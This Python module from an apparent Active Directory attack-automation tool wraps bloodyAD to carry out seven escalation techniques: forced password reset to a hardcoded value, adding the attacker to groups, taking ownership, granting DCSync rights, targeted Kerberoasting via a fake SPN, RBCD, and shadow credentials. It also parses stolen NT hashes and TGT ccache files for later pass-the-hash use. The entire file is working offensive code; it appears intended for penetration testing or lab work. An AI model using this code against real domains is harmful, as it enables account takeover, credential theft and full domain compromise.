# services/ldap_techniques.py
from services.printing import print_done
from entities.exploit_result import ExploitResult
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from strategies.bloodyad_base import HARDCODED_PASSWORD

import re

class ADTechniquesMixin:
    """
    Techniques that write to AD via LDAP (bloodyAD).
    Requires: self.edge, self.attacker, self.target, self._run_bloodyad()
    """
    # ──────────────────────────────────────────────────
    # 1. Force Change Password
    # ──────────────────────────────────────────────────
    def _do_force_change_password(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        new_password = HARDCODED_PASSWORD

        self._run_bloodyad(
            creds,
            ["set", "password", target_sam, new_password],
            "ForceChangePassword"
        )

        print_done(f"Password changed for {target_sam} → {new_password}")
        return ExploitResult(
            technique="ForceChangePassword",
            edge=self.edge,
            success=True,
            notes=(
                f"Password reset for {target_sam}\n"
                f"Username: {target_sam}\n"
                f"Password: {new_password}\n"
                f"Domain: {creds['domain']}"
            ),
            gained_access=Credential(
                username=target_sam,
                password=new_password,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )

    # ──────────────────────────────────────────────────
    # 2. Add Member
    # ──────────────────────────────────────────────────
    def _do_add_member(self, creds: dict) -> ExploitResult:
        group_sam = self.target.sam()
        member_sam = self.attacker.sam()

        try:
            self._run_bloodyad(
                creds,
                ["add", "groupMember", group_sam, member_sam],
                "AddMember"
            )
        except HopFailedError as e:
            error_msg = str(e)
            if "entryAlreadyExists" in error_msg or "already a member" in error_msg:
                print_done(f"{member_sam} already a member of {group_sam} — OK")
                return ExploitResult(
                    technique="AddMember",
                    edge=self.edge,
                    success=True,
                    notes=f"{member_sam} already a member of {group_sam} (idempotent)",
                )
            raise  # re-raise if it's a different error

        print_done(f"{member_sam} added to {group_sam}")
        return ExploitResult(
            technique="AddMember",
            edge=self.edge,
            success=True,
            notes=f"{member_sam} added to {group_sam}",
        )
    
    # ──────────────────────────────────────────────────
    # 3. TakeOwnership
    # ──────────────────────────────────────────────────
    def _do_take_ownership(self, creds:dict) -> ExploitResult:
        attacker_sam = self.attacker.sam()
        target_sam = self.target.sam()

        output = self._run_bloodyad(
            creds,
            ["set", "owner", target_sam, attacker_sam],
            "TakeOwnership"
        )

        print_done(f"{attacker_sam} is now owner of {target_sam}")
        return ExploitResult(
            technique="TakeOwnership",
            edge=self.edge,
            success=True,
            notes=(
                f"{attacker_sam} is now owner of {target_sam}\n"
                f"Next: GrantGenericAll → full control"
            ),
        )
    
    # ──────────────────────────────────────────────────
    # 4. GrantDCSync (WriteDacl on Domain)
    # ──────────────────────────────────────────────────
    def _do_grant_dcsync(self, creds: dict) -> ExploitResult:
        attacker_sam = self.attacker.sam()

        self._run_bloodyad(
            creds,
            ["add", "dcsync", attacker_sam],
            "GrantDCSync"
        )

        print_done(f"{attacker_sam} has now dcsync rights on {creds['domain']}")
        return ExploitResult(
            technique="GrantDCSync",
            edge=self.edge,
            success=True,
            notes=f"{attacker_sam} has now dcsync rights on {creds['domain']}",
        )

    # ──────────────────────────────────────────────────
    # 5. Targeted Kerberoast
    # ──────────────────────────────────────────────────
    def _do_targeted_kerberoast(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        fake_spn = f"fake/roast.{creds['domain']}"

        self._run_bloodyad(
            creds,
            ["set", "object", target_sam, "servicePrincipalNames", fake_spn],
            "TargetedKerberoast"
        )

        print_done(f"SPN set on {target_sam}: {fake_spn}")
        return ExploitResult(
            technique="TargetedKerberoast",
            edge=self.edge,
            success=True,
            notes=f"SPN {fake_spn} added to {target_sam}; ready for Kerberoasting",
        )

    # ──────────────────────────────────────────────────
    # 6. RBCD
    # ──────────────────────────────────────────────────
    def _do_rbcd(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        attacker_sam = self.attacker.sam()

        self._run_bloodyad(
            creds,
            ["add", "rbcd", target_sam, attacker_sam],
            "RBCD"
        )

        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
        return ExploitResult(
            technique="RBCD",
            edge=self.edge,
            success=True,
            notes=f"RBCD configured: {attacker_sam} can impersonate against {target_sam}",
        )
    
    # ──────────────────────────────────────────────────
    # 7. Shadow Credentials
    # ──────────────────────────────────────────────────
    def _do_shadow_credentials(self, creds: dict) -> ExploitResult:
        try:
            target_sam = self.target.sam()

            output = self._run_bloodyad(
                creds,
                ["add", "shadowCredentials", target_sam],
                "ShadowCredentials"
            )

            parsed = self._parse_shadow_credentials_output(output)
            nt_hash = parsed.get("nt_hash","")
            ccache = parsed.get("ccache","")

            if not nt_hash and not ccache:
                raise HopFailedError(
                    "ShadowCredentials",
                    "bloodyAD ran but could not parse NT hash or ccache from output"
                )

            print_done(f"Shadow Credentials set on {target_sam} → NT: {nt_hash}")
            return ExploitResult(
                technique="ShadowCredentials",
                edge=self.edge,
                success=True,
                notes=(
                    f"Shadow credentials added to {target_sam}\n"
                    f"Username : {target_sam}\n"
                    f"NT Hash  : {nt_hash}\n"
                    f"TGT      : {ccache}\n"
                    f"Domain   : {creds['domain']}"
                ),
                gained_access=Credential(
                    username=target_sam,
                    hash=f":{nt_hash}",   # :hash format for pass-the-hash tools
                    ticket=ccache,        # ccache path for Kerberos tools
                    domain=creds.get("domain"),
                    dc_ip=creds.get("dc_ip"),
                ),
            )
        except HopFailedError as e: # ShadowCredentials requires PKINIT support
            if "PKINIT" in str(e) or "PADATA_TYPE_NOSUPP" in str(e):
                raise HopFailedError(
                    self.edge,
                    "ShadowCredentials requires ADCS/PKINIT — not available on this DC"
                )
            raise
    
    def _parse_shadow_credentials_output(self, output: str) -> dict:
        result = {}
        
        # NT hash: "NT: 9029cf007326107eb1c519c84ea60dbe"
        nt_match = re.search(r"NT:\s*([a-fA-F0-9]{32})", output)
        if nt_match:
            result["nt_hash"] = nt_match.group(1)
        
        # ccache path: "TGT stored in ccache file robert.baratheon_WS.ccache"
        ccache_match = re.search(r"TGT stored in ccache file (.+\.ccache)", output)
        if ccache_match:
            result["ccache"] = ccache_match.group(1).strip()
        
        return result